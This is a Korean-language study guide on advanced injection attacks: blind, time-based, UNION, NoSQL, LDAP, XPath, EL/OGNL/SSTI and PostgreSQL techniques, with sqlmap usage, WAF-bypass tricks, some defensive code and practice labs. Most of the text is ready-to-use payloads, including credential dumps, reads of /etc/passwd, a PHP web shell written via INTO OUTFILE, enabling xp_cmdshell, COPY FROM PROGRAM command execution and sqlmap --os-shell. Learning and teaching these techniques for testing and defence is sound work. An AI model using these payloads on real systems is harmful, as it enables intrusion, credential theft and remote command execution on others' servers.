# SQL Injection 심화 — Blind, Time-based, NoSQL

## 1. SQL Injection 유형 정리

| 유형 | 응답 방식 | 설명 |
|------|-----------|------|
| Error-based | 에러 메시지 | DB 오류를 통해 데이터 추출 |
| UNION-based | 결과 직접 출력 | UNION으로 다른 테이블 병합 |
| Blind Boolean | 참/거짓 응답 차이 | 조건에 따른 페이지 변화 |
| Blind Time-based | 응답 지연 | SLEEP/WAITFOR로 데이터 추출 |
| Out-of-band | DNS/HTTP 요청 | 외부 서버로 데이터 유출 |
| Stacked queries | 여러 쿼리 실행 | `;`로 추가 쿼리 삽입 |

---

## 2. Blind SQL Injection

### 2-1. Boolean-based Blind
응답이 참/거짓에 따라 달라지는 것을 이용

```sql
-- 기본 확인 (True → 정상 페이지, False → 다른 페이지)
' AND 1=1--       (True)
' AND 1=2--       (False)

-- DB 이름 길이 파악
' AND LENGTH(database())=5--    (5자면 True)
' AND LENGTH(database())>4--    (4보다 크면 True)

-- DB 이름 문자 추출 (이진 탐색)
' AND SUBSTRING(database(),1,1)='a'--
' AND ASCII(SUBSTRING(database(),1,1))>96--   (소문자라면 True)
' AND ASCII(SUBSTRING(database(),1,1))=109--  (='m')

-- 테이블 이름 추출
' AND SUBSTRING(
    (SELECT table_name FROM information_schema.tables 
     WHERE table_schema=database() LIMIT 0,1),
    1,1)='u'--

-- 컬럼 이름 추출
' AND SUBSTRING(
    (SELECT column_name FROM information_schema.columns
     WHERE table_name='users' LIMIT 0,1),
    1,1)='i'--

-- 데이터 추출
' AND SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1)='5'--
```

### 2-2. Time-based Blind
응답 지연을 통해 True/False 판단

```sql
-- MySQL
' AND SLEEP(5)--                          (무조건 5초 지연)
' AND IF(1=1,SLEEP(5),0)--               (True면 5초 지연)
' AND IF(LENGTH(database())=5,SLEEP(5),0)--

-- DB 이름 추출
' AND IF(ASCII(SUBSTRING(database(),1,1))=109,SLEEP(5),0)--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--
'; IF (LEN(DB_NAME())=6) WAITFOR DELAY '0:0:5'--

-- Oracle
' AND 1=(CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 FROM DUAL WHERE ROWNUM<0) END)--
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--

-- PostgreSQL
'; SELECT pg_sleep(5)--
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

---

## 3. UNION 기반 고급 추출

### 3-1. 컬럼 수 확인
```sql
-- ORDER BY로 컬럼 수 파악
' ORDER BY 1--      (성공)
' ORDER BY 2--      (성공)
' ORDER BY 5--      (실패 → 컬럼 수 = 4)

-- UNION으로 확인
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--   (성공 → 컬럼 3개)
```

### 3-2. 데이터 타입 확인
```sql
-- 문자열 출력 가능한 컬럼 찾기
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```

### 3-3. MySQL 전체 DB 정보 추출
```sql
-- DB 버전 및 사용자
' UNION SELECT @@version,@@user(),database()--

-- 모든 DB 목록
' UNION SELECT schema_name,NULL,NULL FROM information_schema.schemata--

-- 특정 DB의 테이블
' UNION SELECT table_name,NULL,NULL 
  FROM information_schema.tables 
  WHERE table_schema='target_db'--

-- 테이블의 컬럼
' UNION SELECT column_name,data_type,NULL 
  FROM information_schema.columns 
  WHERE table_name='users'--

-- 여러 컬럼 한번에 (GROUP_CONCAT)
' UNION SELECT GROUP_CONCAT(username,':',password),NULL,NULL 
  FROM users--
```

### 3-4. 파일 읽기/쓰기 (MySQL)
```sql
-- 파일 읽기 (FILE 권한 필요)
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL--
' UNION SELECT LOAD_FILE('/var/www/html/config.php'),NULL,NULL--

-- 웹쉘 쓰기 (쓰기 권한 + secure_file_priv 없어야 함)
' UNION SELECT '<?php system($_GET["cmd"]); ?>', NULL, NULL 
  INTO OUTFILE '/var/www/html/shell.php'--
```

---

## 4. DBMS별 차이점

### MySQL
```sql
-- 주석
-- comment
# comment
/*comment*/

-- 문자열 연결
CONCAT('a','b')
'a' 'b'      (공백)

-- 조건부
IF(조건,참,거짓)
SLEEP(5)

-- 시스템 테이블
information_schema.tables
information_schema.columns
```

### MSSQL (SQL Server)
```sql
-- 주석
-- comment
/*comment*/

-- 문자열 연결
'a'+'b'

-- 조건부
CASE WHEN 조건 THEN 참 ELSE 거짓 END

-- 지연
WAITFOR DELAY '0:0:5'

-- 시스템 테이블
sys.tables
sys.columns
INFORMATION_SCHEMA.TABLES

-- OS 명령 실행 (xp_cmdshell)
EXEC xp_cmdshell 'whoami'
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
```

### Oracle
```sql
-- 주석
-- comment
/*comment*/

-- 문자열 연결
'a'||'b'
CONCAT('a','b')

-- NULL 행 처리 (DUAL 테이블)
' UNION SELECT NULL FROM DUAL--

-- 시스템 테이블
all_tables
all_columns
user_tables

-- 사용자 정보
' UNION SELECT user,NULL FROM dual--
```

### PostgreSQL
```sql
-- 주석
-- comment
/*comment*/

-- 문자열 연결
'a'||'b'

-- 지연
pg_sleep(5)

-- 시스템 카탈로그
pg_catalog.pg_tables
information_schema.tables

-- OS 명령 (슈퍼유저)
COPY cmd_exec FROM PROGRAM 'id'
```

---

## 5. SQLMap 실전 활용

### 기본 사용법
```bash
# GET 파라미터
sqlmap -u "http://target.com/page?id=1"

# POST 파라미터
sqlmap -u "http://target.com/login" --data="user=admin&pass=1234"

# 쿠키 기반
sqlmap -u "http://target.com/page" --cookie="PHPSESSID=abc123; id=1"

# 헤더 인젝션
sqlmap -u "http://target.com/" -H "X-Forwarded-For: *"
sqlmap -u "http://target.com/" --user-agent="*"
```

### 정보 수집
```bash
# DB 목록
sqlmap -u "http://target.com/?id=1" --dbs

# 테이블 목록
sqlmap -u "http://target.com/?id=1" -D target_db --tables

# 컬럼 목록
sqlmap -u "http://target.com/?id=1" -D target_db -T users --columns

# 데이터 덤프
sqlmap -u "http://target.com/?id=1" -D target_db -T users --dump

# 전체 덤프
sqlmap -u "http://target.com/?id=1" --dump-all
```

### 고급 옵션
```bash
# WAF 우회 (tamper 스크립트)
sqlmap -u "http://target.com/?id=1" --tamper=space2comment
sqlmap -u "http://target.com/?id=1" --tamper=randomcase,charencode
sqlmap -u "http://target.com/?id=1" --tamper=between,randomcase,space2comment

# 레벨/리스크 조정
sqlmap -u "http://target.com/?id=1" --level=5 --risk=3

# 지연 (속도 조절)
sqlmap -u "http://target.com/?id=1" --delay=1

# OS 쉘 획득
sqlmap -u "http://target.com/?id=1" --os-shell

# 웹쉘 업로드
sqlmap -u "http://target.com/?id=1" --file-write=shell.php --file-dest=/var/www/html/shell.php

# Burp Suite 프록시 연동
sqlmap -u "http://target.com/?id=1" --proxy="http://127.0.0.1:8080"

# 요청 파일 사용 (Burp에서 저장)
sqlmap -r request.txt

# 쿠키 포함
sqlmap -r request.txt --cookie="auth=1"
```

### tamper 스크립트 목록
```
apostrophemask      ' → %EF%BC%87 (유니코드)
base64encode        Base64 인코딩
between             >를 NOT BETWEEN으로
charencode          URL 인코딩
chardoubleencode    이중 URL 인코딩
equaltolike         =를 LIKE로
greatest            >를 GREATEST()로
htmlencode          HTML 인코딩
randomcase          랜덤 대소문자
space2comment       공백을 /**/로
space2plus          공백을 +로
versionedkeywords   MySQL 버전 주석
```

---

## 6. WAF 우회 기법

### 인코딩 우회
```sql
-- URL 인코딩
' OR 1=1--   →   %27%20OR%201%3D1--

-- 이중 URL 인코딩
%27 → %2527

-- 유니코드 우회
' → %u0027
UNION → UN%00ION

-- HTML 엔티티
' → &#39;
```

### 키워드 우회
```sql
-- 주석 삽입
UN/**/ION SE/**/LECT
UNI%00ON
UNION%20SELECT
/*!UNION*/ /*!SELECT*/

-- 대소문자 혼합
UnIoN SeLeCt
uNiOn sElEcT

-- 공백 우회
UNION(SELECT)
UNION%09SELECT      (탭)
UNION%0aSELECT      (개행)
UNION%0dSELECT      (CR)

-- 키워드 중첩
UNUNIONION SESELECTLECT
```

### 논리 연산 우회
```sql
-- AND/OR 대체
' && 1=1--
' || 1=1--
' AND 1=1--    →    '&&1=1--
' OR 1=1--     →    '||1=1--
```

---

## 7. Second-Order SQL Injection

일단 DB에 저장했다가 나중에 다른 쿼리에서 사용될 때 실행

```
1단계: 회원가입 시 username = admin'--  저장
       → 무해하게 이스케이프되어 저장

2단계: 비밀번호 변경 쿼리:
       UPDATE users SET pw='new' WHERE username='admin'--'
       → admin'-- 가 username으로 사용되어
         UPDATE users SET pw='new' WHERE username='admin'
         --' (나머지는 주석)
       → admin 계정 비밀번호가 변경됨!
```

---

## 8. NoSQL Injection (MongoDB)

### MongoDB 기본 공격
```javascript
// 정상 쿼리
db.users.find({username: "admin", password: "pass"})

// NoSQL Injection (JSON 파라미터)
{
  "username": "admin",
  "password": {"$gt": ""}    ← $gt (greater than): 빈 문자열보다 크면 True → 모든 비밀번호 통과
}

// $where 연산자 악용
{"$where": "this.username == 'admin'"}
{"$where": "sleep(5000)"}   ← Time-based Blind
{"$where": "function(){return true}"}
```

### URL 파라미터 NoSQL Injection
```
http://target.com/login?username=admin&password[$gt]=
http://target.com/login?username[$regex]=.*&password[$gt]=
```

### Blind NoSQL Injection
```javascript
// 비밀번호 길이 확인
{"password": {"$regex": "^.{0,10}$"}}   (10자 이하면 True)

// 비밀번호 문자 추출
{"password": {"$regex": "^a"}}   (a로 시작하면 True)
{"password": {"$regex": "^ab"}}
{"password": {"$regex": "^abc"}}
```

---

## 9. SQL Injection 방어

### 준비된 쿼리 (Prepared Statement) — 가장 확실한 방어
```php
// PHP + PDO (취약한 코드)
$result = $db->query("SELECT * FROM users WHERE id='$id'");

// PHP + PDO (안전한 코드)
$stmt = $db->prepare("SELECT * FROM users WHERE id=?");
$stmt->execute([$id]);

// Python + MySQL
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))

// Java + JDBC
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM users WHERE id = ?");
stmt.setString(1, userId);
```

### 입력 검증 및 화이트리스트
```python
import re

def validate_input(user_input):
    # 숫자만 허용
    if not re.match(r'^\d+$', user_input):
        raise ValueError("숫자만 입력 가능")
    return user_input

# 화이트리스트 (허용 목록)
ALLOWED_COLUMNS = ['username', 'email', 'created_at']
if column_name not in ALLOWED_COLUMNS:
    raise ValueError("허용되지 않은 컬럼")
```

### 최소 권한 원칙
```sql
-- 웹 애플리케이션 전용 계정 생성
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'strong_pass';

-- 필요한 권한만 부여 (FILE, SUPER 등 위험 권한 제외)
GRANT SELECT, INSERT, UPDATE, DELETE ON mydb.* TO 'webapp'@'localhost';

-- 관리자 권한 절대 부여 금지
-- GRANT ALL PRIVILEGES ...  ← 위험!
```

---

## 10. LDAP Injection

### LDAP 기본 구조와 공격 원리
```
LDAP 필터 예시:
(&(uid=admin)(userPassword=secret))

공격 페이로드 — 인증 우회:
username: admin)(&
password: anything

결과 필터:
(&(uid=admin)(&)(userPassword=anything))
          → (&) 는 항상 True → 인증 우회!
```

### LDAP Injection 페이로드
```
# 인증 우회
username: *
username: admin)(*
username: *)(uid=*

# 모든 사용자 열거
username: *)(|(uid=*

# 속성 추출 (Blind)
username: admin)(|(password=a*
username: admin)(|(password=b*
→ 응답 차이로 비밀번호 첫 글자 추출
```

### LDAP Injection 방어
```java
// Java: LDAP 특수문자 이스케이프
import javax.naming.ldap.LdapName;

String safeDN = Filter.encodeValue(userInput);
// 특수문자: *, (, ), \, NUL → 이스케이프 처리

// Spring Security LDAP
String query = "(&(uid={0})(objectclass=person))";
// {0} 위치에 자동 이스케이프 적용
```

---

## 11. ORM Injection / Expression Language Injection

### ORM Injection (HQL, JPQL)
```java
// 취약한 Hibernate HQL
String hql = "FROM User WHERE username = '" + username + "'";
Query query = session.createQuery(hql);

// 공격:
// username = ' OR '1'='1
// username = admin' AND SLEEP(5)--

// 안전한 코드 — 파라미터 바인딩
Query query = session.createQuery("FROM User WHERE username = :username");
query.setParameter("username", username);
```

### Expression Language Injection (EL/OGNL)
```
EL Injection 테스트 페이로드:
${7*7}        → 49 출력되면 취약
#{7*7}        → JSF EL
*{7*7}        → Spring SpEL
${java.lang.Runtime.getRuntime().exec('calc')}

OGNL Injection (Struts2):
%{7*7}
%{''.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'calc')}

Server-Side Template Injection (SSTI) 유사 공격:
Jinja2:  {{7*7}}, {{config}}, {{''.__class__.__mro__[1].__subclasses__()}}
Twig:    {{7*7}}
FreeMarker: ${7*7}
Velocity: #set($x=7*7)${x}
```

### EL/SSTI 탐지 및 방어
```bash
# 탐지 페이로드 목록
${7*7}
{{7*7}}
<%= 7*7 %>
#{7*7}

# 방어: 사용자 입력을 템플릿 문자열에 직접 삽입 금지
# Jinja2 안전한 방법
template = Template("Hello {{ name }}")
template.render(name=user_input)  # 올바른 방법

# 위험한 방법
template = Template("Hello " + user_input)  # SSTI 가능!
```

---

## 12. SQL Injection 대량 노출 방지

### LIMIT 제어 우회 및 방어
```sql
-- 공격자: LIMIT 우회로 전체 데이터 추출
' UNION SELECT user, password FROM users LIMIT 1000--
' UNION SELECT user, password FROM users LIMIT 999999--

-- GROUP_CONCAT으로 한 번에 추출
' UNION SELECT GROUP_CONCAT(username,':',password SEPARATOR '\n'),NULL FROM users--
```

```python
# 방어: 최대 반환 행 수 제한
def get_users(page=1, per_page=20):
    # 페이지당 최대 100개로 제한
    per_page = min(per_page, 100)
    offset = (page - 1) * per_page
    
    stmt = text("SELECT id, username FROM users LIMIT :limit OFFSET :offset")
    return db.execute(stmt, {"limit": per_page, "offset": offset})

# API 레이트 리미팅 (대량 추출 방지)
from flask_limiter import Limiter
limiter = Limiter(app, default_limits=["100 per hour", "10 per minute"])
```

---

## 13. XPath Injection

### XPath 기본 구조와 공격 원리
```
XPath는 XML 문서를 탐색하기 위한 언어
XML 기반 애플리케이션(SOAP 서비스 등)에서 XPath 인젝션 발생

취약한 XPath 쿼리 예시:
  /users/user[username/text()='admin' and password/text()='pass']

인증 우회 페이로드:
  username: admin' or '1'='1
  username: ' or 1=1 or '
  username: admin']/..  (경로 탐색)

결과 쿼리:
  /users/user[username/text()='admin' or '1'='1' and password/text()='...']
  → 항상 True → 인증 우회

Boolean 기반 Blind XPath:
  username: admin' and string-length(//user[1]/password)=6 and '1'='1
  → 비밀번호 길이 유추

문자 추출:
  username: admin' and substring(//user[1]/password,1,1)='a' and '1'='1
```

### XPath Injection 방어
```python
# Python lxml: 파라미터 바인딩
from lxml import etree

# 취약한 방식
xpath = f"//user[@name='{username}']"
tree.xpath(xpath)  # 위험!

# 안전한 방식 (lxml Extension Functions)
from lxml.etree import XPath
query = XPath("//user[@name=$name]")
result = query(tree, name=username)  # 파라미터 바인딩

# Java JAXP
// XPath 파라미터 바인딩은 표준이 없어 입력 이스케이프 필요
// 특수문자: ' " < > & → XML 엔티티로 이스케이프
```

---

## 14. PostgreSQL 특화 공격 기법

```sql
-- PostgreSQL 슈퍼유저 확인
SELECT current_user, session_user, pg_is_in_recovery();

-- pg_read_file()으로 파일 읽기 (슈퍼유저 필요)
SELECT pg_read_file('/etc/passwd', 0, 1000);

-- COPY 명령으로 OS 명령 실행 (PostgreSQL 9.3+)
CREATE TABLE cmd_output (output text);
COPY cmd_output FROM PROGRAM 'id';
SELECT * FROM cmd_output;

-- lo_import / lo_export로 파일 업로드/다운로드
SELECT lo_import('/tmp/shell.php');
SELECT lo_export(OID, '/var/www/html/shell.php');

-- 확장 기능 (슈퍼유저)
CREATE EXTENSION IF NOT EXISTS dblink;
SELECT dblink_exec('host=localhost dbname=postgres', 'SELECT pg_sleep(5)');

-- PostgreSQL 버전 정보
SELECT version();
SELECT pg_version_num();
```

---

## 10. SQL Injection 실습 환경

```bash
# DVWA (Damn Vulnerable Web Application)
docker run -d -p 80:80 vulnerables/web-dvwa

# SQLi-labs
docker run -d -p 8080:80 acgpiano/sqli-labs

# WebGoat
docker run -d -p 8080:8080 webgoat/webgoat

# Juice Shop
docker run -d -p 3000:3000 bkimminich/juice-shop
```

### 실습 시나리오
```
1. DVWA → SQL Injection 섹션
   - Security: Low → SQL Injection 수동 공격
   - Security: Medium → GET → POST 우회
   - Security: High → 세션 기반 우회

2. SQLi-labs
   - Less-1 ~ 5: 기본 오류 기반
   - Less-6 ~ 10: 이중 따옴표
   - Less-11 ~ 20: POST 기반
   - Less-21 ~ 37: Cookie/헤더 기반

3. HackTheBox / TryHackMe SQL Injection 챌린지
```
